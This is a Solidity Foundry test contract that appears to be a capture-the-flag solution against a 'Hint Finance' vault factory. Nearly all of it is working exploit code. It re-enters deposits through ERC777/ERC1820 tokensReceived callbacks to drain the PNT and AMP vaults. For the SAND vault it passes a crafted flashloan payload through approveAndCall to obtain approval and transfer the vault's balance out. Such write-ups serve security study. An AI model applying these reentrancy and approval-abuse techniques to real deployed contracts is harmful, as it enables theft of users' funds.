// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.15;

import "forge-std/Test.sol";
import "./Setup.sol";
import "./HintFinanceVault.sol";

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface ISand is ERC20Like {
    function approveAndCall(
        address _target,
        uint256 _amount,
        bytes calldata _data
    ) external;
}

contract Solution is Test{
    bytes32 constant private _TOKENS_RECIPIENT_INTERFACE_HASH =
    0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;
    IERC1820Registry constant internal _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    address[3] public tokens = [
    0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD, // PNT
    0x3845badAde8e6dFF049820680d1F14bD3903a5d0, // SAND
    0xfF20817765cB7f73d4bde2e66e067E58D11095C2 // AMP
    ];
    mapping(address => uint256) public initialBal;
    mapping(address => HintFinanceVault) public vaults;
    mapping(address => bool) public completed;

    UniswapV2RouterLike router = UniswapV2RouterLike(0xf164fC0Ec4E93095b804a4795bBe1e041497b92a);
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    Setup setup;
    HintFinanceFactory hfFactory;

    // we need to get a small portion to start the exploit.
    constructor(address setupAddr) payable {
        setup = Setup(setupAddr);
        hfFactory = HintFinanceFactory(setup.hintFinanceFactory());

        address[] memory path = new address[](2);
        path[0] = weth;
        for (uint256 i = 0; i < tokens.length; ++i) {
            // swap for underlying tokens
            path[1] = tokens[i];
            router.swapExactETHForTokens{value : 1000 ether}(0, path, address(this), block.timestamp);
            initialBal[tokens[i]] = ERC20Like(tokens[0]).balanceOf(address(this));
            completed[tokens[i]] = false;
            vaults[tokens[i]] = HintFinanceVault(hfFactory.underlyingToVault(tokens[i]));
        }
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("AmpTokensRecipient"), address(this));
    }


    function exploitReentrancy(address token) public {
        bool finished = false;
        address vault = hfFactory.underlyingToVault(token);
        emit log_named_decimal_uint("vault balance", initialBal[token], 18);

        while(!finished) {
            completed[token] = false;
            ERC20Like(token).approve(vault, type(uint256).max);
            emit log_named_decimal_uint("deposit token", initialBal[token], 18);

            vaults[token].deposit(initialBal[token]);
            uint bal = vaults[token].balanceOf(address(this));
            vaults[token].withdraw(bal);
            emit log_named_decimal_uint("withdraw token", bal, 18);

            bal = vaults[token].balanceOf(address(this));
            vaults[token].withdraw(bal);
            emit log_named_decimal_uint("withdraw token", bal, 18);

            uint vaultBalanceAfter = ERC20Like(token).balanceOf(vault);
            emit log_named_decimal_uint("vault balance after", vaultBalanceAfter, 18);

            if (initialBal[token]/vaultBalanceAfter > 100) finished = true;
        }
    }


    // fake functions called by approveAndCall
    fallback() external {}

    function transfer(address, uint256) external returns (bool) {
        return true;
    }

    function balanceOf(address) external view returns (uint256) {
        return 1e18;
    }

    function exploitSAND() public {
        address token = tokens[1];
        address vault = hfFactory.underlyingToVault(token);
        uint vaultBalanceInit = ERC20Like(token).balanceOf(vault);
        emit log_named_decimal_uint("vault balance", vaultBalanceInit, 18);

        uint256 vaultUnderlyingBalance = ERC20Like(token).balanceOf(vault);
        ISand sand = ISand(token);

        bytes memory innerPayload = abi.encodeWithSelector(
            bytes4(0x00000000),
            vault,
            bytes32(0),
            bytes32(0),
            bytes32(0)
        );
        bytes memory payload = abi.encodeCall(
            HintFinanceVault.flashloan,
            (address(this), 0xa0, innerPayload)
        );
        sand.approveAndCall(vault, type(uint256).max, payload);
        sand.transferFrom(vault, msg.sender, sand.balanceOf(vault));
        uint vaultBalanceAfter = ERC20Like(token).balanceOf(vault);
        emit log_named_decimal_uint("vault balance after", vaultBalanceAfter, 18);
    }

    function Exploit() public {
        console2.log("PNT");
        exploitReentrancy(tokens[0]);

        console2.log("AMP");
        exploitReentrancy(tokens[2]);

        console2.log("SAND");
        exploitSAND();
    }

    // for underlyingTokens[0]: PNT
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (completed[msg.sender] == false) {
            completed[msg.sender] = true;
            uint bal = ERC20Like(msg.sender).balanceOf(address(this));
            vaults[msg.sender].deposit(bal);
            emit log_named_decimal_uint("re-deposit token", bal, 18);
        }
    }

    // for underlyingTokens[2]: AMP:
    function tokensReceived(bytes4 functionSig, bytes32 partition, address operator, address from, address to, uint256 value, bytes calldata data, bytes calldata operatorData) external {
        if (completed[msg.sender] == false) {
            completed[msg.sender] = true;
            uint bal = ERC20Like(msg.sender).balanceOf(address(this));
            vaults[msg.sender].deposit(bal);
            emit log_named_decimal_uint("re-deposit token", bal, 18);
        }
    }
}